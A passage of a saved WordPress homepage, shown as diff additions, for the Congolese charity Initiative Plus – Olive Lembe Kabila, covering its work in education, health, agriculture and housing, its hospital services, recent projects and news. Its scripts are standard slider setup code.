+							--><rs-layer-wrap class="rs-parallax-wrap " style=" position:absolute;display:block;;pointer-events:none"><rs-loop-wrap style="position:absolute;display:block;"><rs-mask-wrap style="position:absolute;display:block;"><rs-layer id="slider-3-slide-18-layer-2" data-type="text" data-color="rgba(255,255,255,1)" data-rsp_ch="on" data-xy="xo:523px,257px,117px,540px;yo:126px,287px,294px,197px;" data-text="s:40;l:37;fw:700;a:center;" data-frame_1="e:power2.inOut;st:500;sp:480;" data-frame_999="o:0;e:nothing;st:w;" style="z-index:8;font-family:Montserrat;" class="rs-layer" data-idcheck="true">L'EDUCATION EST UN OUTIL<br> ESSENTIEL POUR LE DEVELOPPEMENT 
+							</rs-layer></rs-mask-wrap></rs-loop-wrap></rs-layer-wrap><!--
+
+							--><rs-layer-wrap class="rs-parallax-wrap " style=" position:absolute;display:block;;pointer-events:none"><rs-loop-wrap style="position:absolute;display:block;"><rs-mask-wrap style="position:absolute;display:block;"><rs-layer id="slider-3-slide-18-layer-4" class="ocend-btn rev-btn rs-layer" data-type="button" data-color="rgba(255,255,255,1)" data-xy="xo:868px,283px,144px,121px;yo:209px,450px,452px,314px;" data-text="s:17;l:17;fw:500;" data-rsp_bd="off" data-padding="t:12;r:35;b:12;l:35;" data-frame_0="x:-50px;" data-frame_1="e:power2.inOut;st:500;sp:920;" data-frame_999="o:0;e:nothing;st:w;" data-frame_hover="c:#000;bgc:#fff;boc:#000;bor:0px,0px,0px,0px;bos:solid;oX:50;oY:50;sp:0;e:none;" style="z-index:9;background-color:rgba(255,100,0,0.75);font-family:Roboto;cursor:pointer;outline:none;box-shadow:none;box-sizing:border-box;-moz-box-sizing:border-box;-webkit-box-sizing:border-box;" data-idcheck="true">Education 
+							</rs-layer></rs-mask-wrap></rs-loop-wrap></rs-layer-wrap><!--
+-->						</rs-slide>
+						<rs-slide data-key="rs-19" data-title="Slide" data-in="o:0;" data-out="a:false;" data-originalindex="6" data-origindex="5" data-description="" data-sba="" data-scroll-based="false" style="overflow: hidden; height: 100%; width: 100%;"><rs-sbg-px><rs-sbg-wrap data-key="rs-19"><!--Runtime Modification - Img tag is Still Available for SEO Goals in Source - <img src="//www.initiativeplus-olk.org/wp-content/uploads/2021/03/5X2A3220-scaled.jpg" title="5X2A3220" width="2560" height="1707" data-bg="p:center top;" data-panzoom="d:10000;ss:100;se:105;" class="rev-slidebg" data-no-retina="">--><rs-sbg class="" data-bgcolor="transparent" style="width: 100%; height: 100%;"><canvas style="width: 100%; height: 100%;"></canvas></rs-sbg></rs-sbg-wrap></rs-sbg-px>
+							
+<!--
+							--><rs-layer-wrap class="rs-parallax-wrap " style=" position:absolute;display:block;;pointer-events:none"><rs-loop-wrap style="position:absolute;display:block;"><rs-mask-wrap style="position:absolute;display:block;"><rs-layer id="slider-3-slide-19-layer-1" data-type="text" data-color="rgba(255,255,255,1)" data-rsp_ch="on" data-xy="xo:677px,402px,277px,127px;yo:259px,246px,243px,238px;" data-text="s:22;l:24;" data-dim="w:577px;" data-frame_0="o:1;" data-frame_0_chars="d:5;x:105%;o:1;rX:45deg;rY:0deg;rZ:90deg;" data-frame_0_mask="u:t;" data-frame_1="e:power4.inOut;st:500;sp:2000;" data-frame_1_chars="d:5;" data-frame_1_mask="u:t;" data-frame_999="o:0;e:nothing;st:w;" style="z-index:10;font-family:Montserrat;" class="rs-layer" data-idcheck="true">Marie Olive LEMBE KABILA, presidente de l'Asbl 
+							</rs-layer></rs-mask-wrap></rs-loop-wrap></rs-layer-wrap><!--
+
+							--><rs-layer-wrap class="rs-parallax-wrap " style=" position:absolute;display:block;;pointer-events:none"><rs-loop-wrap style="position:absolute;display:block;"><rs-mask-wrap style="position:absolute;display:block;"><rs-layer id="slider-3-slide-19-layer-2" data-type="text" data-color="rgba(255,255,255,1)" data-rsp_ch="on" data-xy="xo:709px,257px,117px,540px;yo:284px,287px,294px,197px;" data-text="s:40;l:37;fw:700;a:center;" data-frame_1="e:power2.inOut;st:500;sp:480;" data-frame_999="o:0;e:nothing;st:w;" style="z-index:8;font-family:Montserrat;" class="rs-layer" data-idcheck="true">INITIATIVE PLUS OLK 
+							</rs-layer></rs-mask-wrap></rs-loop-wrap></rs-layer-wrap><!--
+-->						</rs-slide>
+					</rs-slides><rs-progress style="visibility:hidden;"><rs-progress-bar style="background: rgba(255, 255, 255, 0.498039); transform-origin: 0% 50% 0px; transform: translate3d(0px, 0px, 0px) scale(0.5016, 1);"></rs-progress-bar></rs-progress></rs-module>
+				
+				<script type="text/javascript">
+					setREVStartSize({c: 'rev_slider_3_1',rl:[1240,1024,778,480],el:[868,768,960,720],gw:[1240,1024,778,480],gh:[868,768,960,720],type:'standard',justify:'',layout:'fullwidth',mh:"0"});
+					var	revapi3,
+						tpj;
+					function revinit_revslider31() {
+					jQuery(function() {
+						tpj = jQuery;
+						revapi3 = tpj("#rev_slider_3_1");
+						if(revapi3==undefined || revapi3.revolution == undefined){
+							revslider_showDoubleJqueryError("rev_slider_3_1");
+						}else{
+							revapi3.revolution({
+								sliderLayout:"fullwidth",
+								visibilityLevels:"1240,1024,778,480",
+								gridwidth:"1240,1024,778,480",
+								gridheight:"868,768,960,720",
+								spinner:"spinner0",
+								perspective:600,
+								perspectiveType:"local",
+								editorheight:"868,768,960,720",
+								responsiveLevels:"1240,1024,778,480",
+								progressBar:{disableProgressBar:true},
+								navigation: {
+									onHoverStop:false
+								},
+								fallbacks: {
+									allowHTML5AutoPlayOnAndroid:true
+								},
+							});
+						}
+						
+					});
+					} // End of RevInitScript
+				var once_revslider31 = false;
+				if (document.readyState === "loading") {document.addEventListener('readystatechange',function() { if((document.readyState === "interactive" || document.readyState === "complete") && !once_revslider31 ) { once_revslider31 = true; revinit_revslider31();}});} else {once_revslider31 = true; revinit_revslider31();}
+				</script>
+			</rs-module-wrap><rs-fw-forcer style="height:868px"></rs-fw-forcer></rs-fullwidth-wrap>
+			<!-- END REVOLUTION SLIDER -->
+</div></div></div></div><div class="vc_row-full-width"></div><div class="vc_row_anchor js_stretch_anchor anchor-simple" style="width: 1351px; margin-left: -105.5px;"></div><div class="vc_row wpb_row vc_row-fluid vc_pixrow-padding-both kswr_pnone kswr_mnone kswr_bnone"><div class="kswr-row-element-back" data-classes="kswr_pnone kswr_mnone kswr_bnone"></div><div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner"><div class="wpb_wrapper">
+	<div class="section-heading  text-center">
+		
+		<div class="section-title">Nos domaines d'activités</div>
+		<div class="section-subtitle">L'Asbl IPOLK intervient dans ces 4 domaines</div>
+		<div class="design-arrow"></div>
+		
+	</div>
+<div class="vc_row wpb_row vc_inner vc_row-fluid kswr_pnone kswr_mnone kswr_bnone"><div class="kswr-row-element-back" data-classes="kswr_pnone kswr_mnone kswr_bnone"></div><div class="wpb_column vc_column_container vc_col-sm-3"><div class="vc_column-inner"><div class="wpb_wrapper">
+
+	<div class="feature-item  wow fadeIn" style="visibility: visible; animation-name: fadeIn;">
+		<div class="wrap-feature-icon">
+
+			<div class="feature-icon">
+				<span class="icon icon-Book"></span>
+			</div>
+
+		</div>
+		<div class="title">Education</div>
+		<div class="text">L’éducation est un outil essentiel pour le développement économique, social et culturel des populations. Et l’âge technologique qu’est le nôtre, nous avons le devoir de développer de nouveaux champs de compétences pour les jeunes.</div>
+	</div>
+</div></div></div><div class="wpb_column vc_column_container vc_col-sm-3"><div class="vc_column-inner"><div class="wpb_wrapper">
+
+	<div class="feature-item  wow fadeIn" style="visibility: visible; animation-name: fadeIn;">
+		<div class="wrap-feature-icon">
+
+			<div class="feature-icon">
+				<span class="icon icon-Seringe"></span>
+			</div>
+
+		</div>
+		<div class="title">Santé</div>
+		<div class="text">Nous nous inscrivons dans la logique de renforcer l’accès aux vulnérables de la société à des soins de santé de qualité, faire reculer le taux de mortalité des enfants et améliorer la santé des femmes dans le cadre d’une maternité responsable…</div>
+	</div>
+</div></div></div><div class="wpb_column vc_column_container vc_col-sm-3"><div class="vc_column-inner"><div class="wpb_wrapper">
+
+	<div class="feature-item  wow fadeIn" style="visibility: visible; animation-name: fadeIn;">
+		<div class="wrap-feature-icon">
+
+			<div class="feature-icon">
+				<span class="icon icon-Wheelbarrow"></span>
+			</div>
+
+		</div>
+		<div class="title">Agriculture</div>
+		<div class="text">La production vivrière et un système agricole solides sont des piliers de la croissance économique. Ils contribuent largement à la réduction de la pauvreté et assurent notre sécurité et indépendance alimentaire…</div>
+	</div>
+</div></div></div><div class="wpb_column vc_column_container vc_col-sm-3"><div class="vc_column-inner"><div class="wpb_wrapper">
+
+	<div class="feature-item  wow fadeIn" style="visibility: visible; animation-name: fadeIn;">
+		<div class="wrap-feature-icon">
+
+			<div class="feature-icon">
+				<span class="icon icon-ManFigure"></span>
+			</div>
+
+		</div>
+		<div class="title">Habitat</div>
+		<div class="text">Le Congo est aujourd’hui touché par notamment la crise du logement. D’où la nécessité de construire toujours plus de logements. Nous avons voulu donner le ton aux autres, privé comme public, matérialisant ce projet de construction de la cité Olive Lembe Kabila.</div>
+	</div>
+</div></div></div></div></div></div></div></div><div class="vc_row_anchor js_stretch_anchor anchor-simple" style="width: 1351px; margin-left: -105.5px;"></div><div class="vc_row wpb_row vc_row-fluid vc_pixrow-padding-both kswr_pnone kswr_mnone kswr_bnone"><div class="kswr-row-element-back" data-classes="kswr_pnone kswr_mnone kswr_bnone"></div><div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner"><div class="wpb_wrapper">
+	<div class="wpb_single_image wpb_content_element vc_align_center  wpb_animate_when_almost_visible wpb_bottom-to-top bottom-to-top wpb_start_animation animated">
+		
+		<figure class="wpb_wrapper vc_figure">
+			<div class="vc_single_image-wrapper   vc_box_border_grey"><img width="1024" height="343" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/CITÉ-OLK.jpg" class="vc_single_image-img attachment-full" alt="" srcset="https://www.initiativeplus-olk.org/wp-content/uploads/2021/03/CITÉ-OLK.jpg 1024w, https://www.initiativeplus-olk.org/wp-content/uploads/2021/03/CITÉ-OLK-300x100.jpg 300w, https://www.initiativeplus-olk.org/wp-content/uploads/2021/03/CITÉ-OLK-768x257.jpg 768w, https://www.initiativeplus-olk.org/wp-content/uploads/2021/03/CITÉ-OLK-70x23.jpg 70w" sizes="(max-width: 1024px) 100vw, 1024px"></div>
+		</figure>
+	</div>
+</div></div></div></div><div class="vc_row_anchor js_stretch_anchor anchor-simple" style="width: 1351px; margin-left: -105.5px;"></div><div class="vc_row wpb_row vc_row-fluid vc_pixrow-no-padding vc_custom_1458499334752 kswr_pnone kswr_mnone kswr_bnone"><div class="kswr-row-element-back" data-classes="kswr_pnone kswr_mnone kswr_bnone"></div><div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner"><div class="wpb_wrapper">
+	<div class="wpb_single_image wpb_content_element vc_align_center  wpb_animate_when_almost_visible wpb_bottom-to-top bottom-to-top wpb_start_animation animated">
+		
+		<figure class="wpb_wrapper vc_figure">
+			<div class="vc_single_image-wrapper   vc_box_border_grey"><img width="858" height="124" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/content-logo-2.png" class="vc_single_image-img attachment-full" alt="" srcset="https://www.initiativeplus-olk.org/wp-content/uploads/2021/03/content-logo-2.png 858w, https://www.initiativeplus-olk.org/wp-content/uploads/2021/03/content-logo-2-300x43.png 300w, https://www.initiativeplus-olk.org/wp-content/uploads/2021/03/content-logo-2-768x111.png 768w, https://www.initiativeplus-olk.org/wp-content/uploads/2021/03/content-logo-2-70x10.png 70w" sizes="(max-width: 858px) 100vw, 858px"></div>
+		</figure>
+	</div>
+</div></div></div></div><div class="vc_row_anchor js_stretch_anchor anchor-effect" style="width: 1351px; margin-left: -105.5px;">
+		<div class="wrap-anchor">
+			<a class="wrap-anchor-link" href="https://www.initiativeplus-olk.org/#areas-section"><div class="section-icon"><span class="icon icon-Umbrella"></span></div></a>
+		</div></div><div id="areas-section" class="vc_row wpb_row vc_row-fluid vc_pixrow-no-padding vc_custom_1458499882648 kswr_pnone kswr_mnone kswr_bnone"><div class="kswr-row-element-back" data-classes="kswr_pnone kswr_mnone kswr_bnone"></div><div class="wpb_column vc_column_container vc_col-sm-6"><div class="vc_column-inner"><div class="wpb_wrapper">
+	<div class="section-heading  text-right">
+		<div class="section-abovetitle">Nous comptons couvrir toute la RDC</div>
+		<div class="section-title">NOS AXES D'INTERVENTIONS</div>
+		
+		<div class="design-arrow"></div>
+		<div class="section-content">Initiative Plus – Olive Lembe Kabila est une Asbl caritative et d’interêt communautaire. Créée en 2007 par Madame Marie-Olive LEMBE KABILA alors première dame de République Démocratique du Congo, IPOLK axe ses actions et interventions dans quatre secteurs à savoir: L’education, la santé, l’agriculture, l’habitat.<p></p>
+<p>A ce jour, Initiative Plus est installée dans les provinces ci-après: La ville province de Kinshasa, la province du Haut Katanga, la province du Maniema, la province du Nord-Kivu, la province du Sud-Kivu.</p></div>
+	</div>
+</div></div></div><div class="wpb_column vc_column_container vc_col-sm-6"><div class="vc_column-inner"><div class="wpb_wrapper">
+	<div class="wpb_single_image wpb_content_element vc_align_center">
+		
+		<figure class="wpb_wrapper vc_figure">
+			<div class="vc_single_image-wrapper   vc_box_border_grey"><img width="356" height="395" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/areas-2.png" class="vc_single_image-img attachment-full" alt="" srcset="https://www.initiativeplus-olk.org/wp-content/uploads/2021/03/areas-2.png 356w, https://www.initiativeplus-olk.org/wp-content/uploads/2021/03/areas-2-270x300.png 270w, https://www.initiativeplus-olk.org/wp-content/uploads/2021/03/areas-2-63x70.png 63w" sizes="(max-width: 356px) 100vw, 356px"></div>
+		</figure>
+	</div>
+</div></div></div></div><div class="vc_row_anchor js_stretch_anchor anchor-simple" style="width: 1351px; margin-left: -105.5px;"></div><div class="vc_row wpb_row vc_row-fluid vc_pixrow-no-padding vc_custom_1458673889248 kswr_pnone kswr_mnone kswr_bnone"><div class="kswr-row-element-back" data-classes="kswr_pnone kswr_mnone kswr_bnone"></div><div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner"><div class="wpb_wrapper">
+	<div class="section-heading  text-center">
+		
+		<div class="section-title">Derniers projets réalisés</div>
+		<div class="section-subtitle">Les photos des nos réalisations</div>
+		<div class="design-arrow"></div>
+		
+	</div>
+</div></div></div></div><div class="vc_row_anchor js_stretch_anchor anchor-simple" style="width: 1351px; margin-left: -105.5px;"></div><div data-vc-full-width="true" data-vc-full-width-init="true" data-vc-stretch-content="true" class="vc_row wpb_row vc_row-fluid vc_pixrow-no-padding vc_custom_1458754772326 vc_row-no-padding kswr_pnone kswr_mnone kswr_bnone" style="position: relative; left: -90.5px; box-sizing: border-box; width: 1351px;"><div class="kswr-row-element-back" data-classes="kswr_pnone kswr_mnone kswr_bnone"></div><div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner"><div class="wpb_wrapper">
+<!-- This file should primarily consist of HTML with a little bit of PHP. -->
+  
+		<div class="latest-works-section clearfix">
+			<div class="scroll-pane " style="overflow: hidden;">
+	
+			<div class="scroll-content">
+		
+
+				<div class="scroll-content-item " id="post-1535">
+					<a href="https://www.initiativeplus-olk.org/portfolio/sante-bientot-linauguration-de-lhopital-initiative-plus-olk-dans-la-commune-de-la-nsele/"><img width="555" height="555" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/A2-555x555.jpg" class="attachment-oscend-portfolio-thumb size-oscend-portfolio-thumb wp-post-image" alt=""></a>
+					<div class="name">Inauguration de l’hôpital Initiative Plus Olk dans la commune de la N’sele</div>
+				</div>
+
+			
+
+				<div class="scroll-content-item " id="post-14157">
+					<a href="https://www.initiativeplus-olk.org/portfolio/lasbl-ipolk-vole-au-secours-des-sinistres-des-incendies-de-bukavu/"><img width="555" height="555" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/TCJ_1774-555x555.jpg" class="attachment-oscend-portfolio-thumb size-oscend-portfolio-thumb wp-post-image" alt=""></a>
+					<div class="name">L’Asbl IPOLK vole au secours des sinistrés des incendies de Bukavu</div>
+				</div>
+
+			
+
+				<div class="scroll-content-item " id="post-14096">
+					<a href="https://www.initiativeplus-olk.org/portfolio/marie-olive-lembe-kabila-offre-aux-congolais-un-centre-pediatrique-de-chirurgie-cardiaque/"><img width="555" height="370" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/DSC_6490-scaled.jpg" class="attachment-oscend-portfolio-thumb size-oscend-portfolio-thumb wp-post-image" alt=""></a>
+					<div class="name">Marie Olive Lembe Kabila offre aux Congolais un Centre de chirurgie à coeur ouvert</div>
+				</div>
+
+			
+
+				<div class="scroll-content-item " id="post-14108">
+					<a href="https://www.initiativeplus-olk.org/portfolio/mariage-des-policiers-et-militaires-a-kindu-au-maniema/"><img width="555" height="555" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/DSC_5644-555x555.jpg" class="attachment-oscend-portfolio-thumb size-oscend-portfolio-thumb wp-post-image" alt=""></a>
+					<div class="name">Mariage des policiers et militaires à Kindu au Maniema</div>
+				</div>
+
+			
+
+				<div class="scroll-content-item " id="post-14128">
+					<a href="https://www.initiativeplus-olk.org/portfolio/campagne-medicale-gratuite-lubumbashi/"><img width="555" height="555" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/24-555x555.jpg" class="attachment-oscend-portfolio-thumb size-oscend-portfolio-thumb wp-post-image" alt=""></a>
+					<div class="name">Campagne médicale gratuite Lubumbashi</div>
+				</div>
+
+			
+
+				<div class="scroll-content-item " id="post-14097">
+					<a href="https://www.initiativeplus-olk.org/portfolio/marie-olive-lembe-kabila-offre-120-villas-aux-familles-demunis/"><img width="555" height="555" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/500m-555x555.jpg" class="attachment-oscend-portfolio-thumb size-oscend-portfolio-thumb wp-post-image" alt=""></a>
+					<div class="name">Marie Olive Lembe Kabila offre 120 villas aux familles démunis</div>
+				</div>
+
+			
+			</div>
+		
+			<div class="scroll-bar-wrap ">
+				<div class="scroll-bar ui-slider ui-slider-horizontal ui-widget ui-widget-content ui-corner-all"><div class="ui-handle-helper-parent" style="width: 0px;"><span class="ui-slider-handle ui-state-default ui-corner-all" tabindex="0" style="left: 0%; width: 802.286px; margin-left: -401.143px;"><span class="ui-icon ui-icon-grip-dotted-vertical"></span></span></div></div>
+			</div>
+		</div>
+	</div>
+</div></div></div></div><div class="vc_row-full-width"></div><div class="vc_row_anchor js_stretch_anchor anchor-simple" style="width: 1351px; margin-left: -105.5px;"></div><div class="vc_row wpb_row vc_row-fluid vc_pixrow-no-padding with-bottom-effect kswr_pnone kswr_mnone kswr_bnone"><div class="kswr-row-element-back" data-classes="kswr_pnone kswr_mnone kswr_bnone"></div><div class="bottom-effect"></div><div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner"><div class="wpb_wrapper">
+	<div class="wpb_single_image wpb_content_element vc_align_center">
+		
+		<figure class="wpb_wrapper vc_figure">
+			<div class="vc_single_image-wrapper   vc_box_border_grey"><img width="1024" height="713" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/home-top-background-1024x713-1.jpg" class="vc_single_image-img attachment-full" alt="" srcset="https://www.initiativeplus-olk.org/wp-content/uploads/2021/03/home-top-background-1024x713-1.jpg 1024w, https://www.initiativeplus-olk.org/wp-content/uploads/2021/03/home-top-background-1024x713-1-300x209.jpg 300w, https://www.initiativeplus-olk.org/wp-content/uploads/2021/03/home-top-background-1024x713-1-768x535.jpg 768w, https://www.initiativeplus-olk.org/wp-content/uploads/2021/03/home-top-background-1024x713-1-70x49.jpg 70w" sizes="(max-width: 1024px) 100vw, 1024px"></div>
+		</figure>
+	</div>
+</div></div></div></div><div class="vc_row_anchor js_stretch_anchor anchor-simple" style="width: 1351px; margin-left: -105.5px;"></div><div class="vc_row wpb_row vc_row-fluid vc_pixrow-no-padding vc_custom_1458763584776 kswr_pnone kswr_mnone kswr_bnone"><div class="kswr-row-element-back" data-classes="kswr_pnone kswr_mnone kswr_bnone"></div><div class="wpb_column vc_column_container vc_col-sm-4"><div class="vc_column-inner"><div class="wpb_wrapper">
+	<div class="service-item ">
+		<div class="media-left">
+			<div class="wrap-service-icon">
+
+				<div class="service-icon">
+					<span class="icon icon-Star"></span>
+				</div>
+
+			</div>
+		</div>
+		<div class="media-body">
+			<h5>Urgences</h5>
+			<div class="under_title">Urgences</div>
+			<div class="service-item-text"></div>
+		</div>
+	</div>
+<div class="vc_separator wpb_content_element vc_separator_align_center vc_sep_width_100 vc_sep_pos_align_center vc_separator_no_text  hidden-xs"><span class="vc_sep_holder vc_sep_holder_l"><span style="border-color:#eff2f7;" class="vc_sep_line"></span></span><span class="vc_sep_holder vc_sep_holder_r"><span style="border-color:#eff2f7;" class="vc_sep_line"></span></span>
+</div>
+	<div class="service-item ">
+		<div class="media-left">
+			<div class="wrap-service-icon">
+
+				<div class="service-icon">
+					<span class="icon icon-Star"></span>
+				</div>
+
+			</div>
+		</div>
+		<div class="media-body">
+			<h5>Imagerie médicale</h5>
+			<div class="under_title">Imagerie médicale</div>
+			<div class="service-item-text"></div>
+		</div>
+	</div>
+</div></div></div><div class="wpb_column vc_column_container vc_col-sm-4"><div class="vc_column-inner"><div class="wpb_wrapper">
+	<div class="service-item ">
+		<div class="media-left">
+			<div class="wrap-service-icon">
+
+				<div class="service-icon">
+					<span class="icon icon-Star"></span>
+				</div>
+
+			</div>
+		</div>
+		<div class="media-body">
+			<h5>Medecine Interne</h5>
+			<div class="under_title">Medecine Interne</div>
+			<div class="service-item-text"></div>
+		</div>
+	</div>
+<div class="vc_separator wpb_content_element vc_separator_align_center vc_sep_width_100 vc_sep_pos_align_center vc_separator_no_text  hidden-xs"><span class="vc_sep_holder vc_sep_holder_l"><span style="border-color:#eff2f7;" class="vc_sep_line"></span></span><span class="vc_sep_holder vc_sep_holder_r"><span style="border-color:#eff2f7;" class="vc_sep_line"></span></span>
+</div>
+	<div class="service-item ">
+		<div class="media-left">
+			<div class="wrap-service-icon">
+
+				<div class="service-icon">
+					<span class="icon icon-Star"></span>
+				</div>
+
+			</div>
+		</div>
+		<div class="media-body">
+			<h5>Urologie</h5>
+			<div class="under_title">Urologie</div>
+			<div class="service-item-text"></div>
+		</div>
+	</div>
+</div></div></div><div class="wpb_column vc_column_container vc_col-sm-4"><div class="vc_column-inner"><div class="wpb_wrapper">
+	<div class="service-item ">
+		<div class="media-left">
+			<div class="wrap-service-icon">
+
+				<div class="service-icon">
+					<span class="icon icon-Star"></span>
+				</div>
+
+			</div>
+		</div>
+		<div class="media-body">
+			<h5>Pediatrie</h5>
+			<div class="under_title">Pediatrie</div>
+			<div class="service-item-text"></div>
+		</div>
+	</div>
+<div class="vc_separator wpb_content_element vc_separator_align_center vc_sep_width_100 vc_sep_pos_align_center vc_separator_no_text  hidden-xs"><span class="vc_sep_holder vc_sep_holder_l"><span style="border-color:#eff2f7;" class="vc_sep_line"></span></span><span class="vc_sep_holder vc_sep_holder_r"><span style="border-color:#eff2f7;" class="vc_sep_line"></span></span>
+</div>
+	<div class="service-item ">
+		<div class="media-left">
+			<div class="wrap-service-icon">
+
+				<div class="service-icon">
+					<span class="icon icon-Star"></span>
+				</div>
+
+			</div>
+		</div>
+		<div class="media-body">
+			<h5>Gynécologie et maternité</h5>
+			<div class="under_title">Gynécologie et maternité</div>
+			<div class="service-item-text"></div>
+		</div>
+	</div>
+</div></div></div></div><div class="vc_row_anchor js_stretch_anchor anchor-simple" style="width: 1351px; margin-left: -105.5px;"></div><div class="vc_row wpb_row vc_row-fluid vc_pixrow-no-padding with-bottom-effect kswr_pnone kswr_mnone kswr_bnone"><div class="kswr-row-element-back" data-classes="kswr_pnone kswr_mnone kswr_bnone"></div><div class="bottom-effect"></div><div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner"><div class="wpb_wrapper">
+	<div class="section-heading  text-center">
+		
+		<div class="section-title">Notre équipe</div>
+		<div class="section-subtitle">Tout le monde compte, une équipe forte accompagne Marie Olive Lembe Kabila</div>
+		<div class="design-arrow"></div>
+		
+	</div>
+
+
+	<div class="wrap-team-slider ">
+		<div class="prev-btn slick-arrow slick-hidden" aria-disabled="true" tabindex="-1"><span class="icon invertX icon-Goto"></span></div>
+		<div class="next-btn slick-arrow slick-hidden" aria-disabled="true" tabindex="-1"><span class="icon icon-Goto"></span></div>
+		<div class="team-slider enable-stick-slider slick-initialized slick-slider" data-slick="{&quot;slidesToShow&quot;: 3, &quot;slidesToScroll&quot;: 1, &quot;prevArrow&quot; : &quot;.prev-btn&quot;, &quot;nextArrow&quot;: &quot;.next-btn&quot; }">
+			
+
+	<div aria-live="polite" class="slick-list draggable"><div class="slick-track" role="listbox" style="opacity: 1; width: 357px; transform: translate3d(0px, 0px, 0px);"><div class="slide-item  slick-slide slick-current slick-active" data-slick-index="0" aria-hidden="false" tabindex="0" role="option" aria-describedby="slick-slide00" style="width: 357px;">
+			<div class="image">
+				<img src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/member-olk.png" class="img-responsive" alt="Marie Olive Lembe Kabila">
+			</div>
+			<div class="slide-description">
+				<div class="member-info">
+					<div class="name">Marie Olive LEMBE KABILA</div>
+					<div class="position">Présidente Nationale</div>
+				</div>
+				<div class="contacts">
+
+						<ul><li><a href="https://twitter.com/" target="_blank" tabindex="0"><i class="fa fa-twitter"></i></a></li><li><a href="https://www.facebook.com/" target="_blank" tabindex="0"><i class="fa fa-facebook"></i></a></li><li><a href="https://www.linkedin.com/" target="_blank" tabindex="0"><i class="fa fa-linkedin"></i></a></li><li><a href="https://www.googleplus.com/" target="_blank" tabindex="0"><i class="fa fa-google-plus"></i></a></li><li><a href="mailto:youremail@example.com" tabindex="0"><i class="fa fa-envelope"></i></a></li></ul>
+	
+				</div>
+			</div>
+		</div></div></div>
+
+
+		</div>
+	</div>
+
+</div></div></div></div><div class="vc_row_anchor js_stretch_anchor anchor-simple" style="width: 1351px; margin-left: -105.5px;"></div><div class="vc_row wpb_row vc_row-fluid vc_pixrow-no-padding vc_custom_1458825189873 kswr_pnone kswr_mnone kswr_bnone"><div class="kswr-row-element-back" data-classes="kswr_pnone kswr_mnone kswr_bnone"></div><div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner"><div class="wpb_wrapper">
+	<div class="section-heading  text-center">
+		
+		<div class="section-title">A LA UNE</div>
+		<div class="section-subtitle">les derniers news d'IPOLK</div>
+		<div class="design-arrow"></div>
+		
+	</div>
+
+		<div class="reviews-slider  owl-carousel enable-owl-carousel owl-theme " data-auto-play="4000" data-min600="1" data-min800="1" data-min1200="1" style="opacity: 1; display: block;">
+			
+
+	<div class="owl-wrapper-outer"><div class="owl-wrapper" style="width: 2280px; left: 0px; display: block; transition: all 1000ms ease; transform: translate3d(0px, 0px, 0px);"><div class="owl-item" style="width: 1140px;"><div class="slide-item ">
+		<div class="media-left">
+			<div class="image-block">
+				<img src="https://www.initiativeplus-olk.org/" alt="Home">
+			</div>
+		</div>
+		<div class="media-body">
+			<div class="description-block">
+				<div class="name">
+					
+					<span>Oscend Creative Inc.</span>
+				</div>
+				<div class="review">
+					
+				</div>
+			</div>
+		</div>
+	</div></div></div></div>
+
+
+		<div class="owl-controls clickable" style="display: none;"><div class="owl-pagination"><div class="owl-page active"><span class=""></span></div></div></div></div>
+	</div></div></div></div><div class="vc_row_anchor js_stretch_anchor anchor-effect" style="width: 1351px; margin-left: -105.5px;">
+		<div class="wrap-anchor">
+			<a class="wrap-anchor-link" href="https://www.initiativeplus-olk.org/#latest-news"><div class="section-icon"><span class="icon icon-Umbrella"></span></div></a>
+		</div></div><div id="latest-news" class="vc_row wpb_row vc_row-fluid vc_pixrow-no-padding vc_custom_1458850811916 kswr_pnone kswr_mnone kswr_bnone"><div class="kswr-row-element-back" data-classes="kswr_pnone kswr_mnone kswr_bnone"></div><div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner"><div class="wpb_wrapper">
+	<div class="section-heading  text-center">
+		
+		<div class="section-title">Toutes les news</div>
+		
+		<div class="design-arrow"></div>
+		
+	</div>
+
+<!-- This file should primarily consist of HTML with a little bit of PHP. -->
+  
+	<div class="row blog-masonry-holder" style="position: relative; height: 664.953px;">
+
+			<div class="col-md-4 col-sm-4  item" style="position: absolute; left: 0px; top: 0px;">
+				<div class="news-item">
+					<div class="meta">
+						
+						<div class="meta-item"><span class="icon icon-Agenda"></span><a href="https://www.initiativeplus-olk.org/marie-olive-lembe-kabila-donne-des-kits-scolaires-a-des-centaines-deleves-de-boma/">1 octobre 2022</a></div>
+						
+					</div>
+					<div class="image">
+						<a href="https://www.initiativeplus-olk.org/marie-olive-lembe-kabila-donne-des-kits-scolaires-a-des-centaines-deleves-de-boma/">
+							<img src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/WhatsApp-Image-2022-09-22-at-12.40.35-555x400.jpeg" alt="Marie -Olive Lembe Kabila donne des kits scolaires à des centaines d’élèves de Boma">
+							<div class="image-content">
+								<span class="read-more">Lire la suite</span>
+							</div>
+						</a>
+					</div>
+					<div class="user-avatar clearfix">
+					
+			<a class="avatar" href="http://www.initiativeplus-olk.org/">
+				<img class="" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/0e42442c4beef6f0302ba337c5c7ffc6" alt="Serge Ndjibu">
+			</a>
+		
+					</div>
+					<div class="news-body">
+						<h5 class="post-title">Marie -Olive Lembe Kabila donne des kits scolaires à des centaines d’élèves de Boma</h5>
